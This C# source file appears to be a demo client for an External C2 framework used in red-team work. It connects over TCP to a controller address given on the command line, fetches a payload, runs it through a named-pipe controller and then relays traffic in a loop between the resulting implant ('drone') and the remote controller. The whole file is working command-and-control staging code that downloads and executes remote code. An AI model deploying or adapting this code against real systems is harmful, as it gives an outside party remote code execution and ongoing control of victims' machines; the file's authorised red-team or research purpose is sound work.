using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

using ExternalC2.Net.Client;

namespace DemoClient;

internal static class Program
{
    public static async Task Main(string[] args)
    {
        if (args.Length != 2)
        {
            Console.WriteLine("demo-client.exe <address> <port>");
            return;
        }
        
        var target = IPAddress.Parse(args[0]);
        var port = int.Parse(args[1]);

        // connect to controller
        var client = new TcpClient();
        await client.ConnectAsync(target, port);
        
        // generate and send a pipename
        var pipename = Guid.NewGuid().ToString();
        await client.WriteData(Encoding.Default.GetBytes(pipename));
        
        // read payload
        var payload = await client.ReadData();
        
        // create new client controller
        var controller = new ClientController(pipename);
        
        if (!await controller.ExecutePayload(payload))
        {
            Console.WriteLine("Failed to connect to pipe");
            return;
        }
        
        // drop into a loop
        while (controller.Connected)
        {
            // read from drone
            var outbound = await controller.ReadDrone();

            // send to controller
            await client.WriteData(outbound);

            // read from controller
            var inbound = await client.ReadData();

            // send to drone
            await controller.SendDrone(inbound);

            await Task.Delay(100);
        }

        controller.Dispose();
    }
}